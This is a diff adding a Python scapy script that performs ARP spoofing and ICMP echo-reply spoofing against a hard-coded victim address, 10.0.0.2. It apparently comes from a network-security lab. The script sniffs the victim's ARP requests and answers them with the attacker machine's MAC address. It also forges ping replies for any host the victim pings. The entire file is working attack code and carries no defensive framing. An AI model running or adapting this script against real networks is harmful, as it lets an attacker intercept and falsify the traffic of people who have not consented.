@@ -1,0 +1,39 @@
+from scapy.all import *
+import uuid
+import re
+import threading
+
+def arp_spoof(arp_request):
+    atk_mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    arp_reply = Ether() / ARP()
+    arp_reply[Ether].dst = arp_request.src
+    arp_reply[ARP].hwdst = arp_request.hwsrc
+    arp_reply[ARP].hwsrc = atk_mac
+    arp_reply[ARP].op = 2  # Operation Code, 2 means Reply
+    arp_reply[ARP].psrc = arp_request.pdst
+    arp_reply[ARP].pdst = arp_request.psrc
+    sendp(arp_reply, verbose=False)
+def icmp_spoof(icmp_pkt):
+    icmp_reply = Ether() / IP() / ICMP() / Raw()
+    icmp_reply[Ether].dst = icmp_pkt.getlayer(Ether).src
+    icmp_reply[Ether].src = icmp_pkt.getlayer(Ether).dst
+    icmp_reply[IP].src = icmp_pkt.getlayer(IP).dst
+    icmp_reply[IP].dst = icmp_pkt.getlayer(IP).src
+    icmp_reply[ICMP].type = "echo-reply"
+    icmp_reply[ICMP].id = icmp_pkt.getlayer(ICMP).id
+    icmp_reply[ICMP].seq = icmp_pkt.getlayer(ICMP).seq   
+    icmp_reply[Raw].load = icmp_pkt.getlayer(Raw).load
+
+    sendp(icmp_reply, verbose=False)
+
+def arp_sniff():
+    sniff(iface="eth1", filter="arp and src host " + victim_ip, prn=arp_spoof)
+def icmp_sniff():
+     sniff(iface="eth1", filter="icmp and src host " + victim_ip, prn=icmp_spoof)
+
+if __name__ == "__main__":
+     victim_ip = "10.0.0.2"
+     t1 = threading.Thread(target=arp_sniff, args=())
+     t1.start()
+     t2 = threading.Thread(target=icmp_sniff, args=())
+     t2.start()
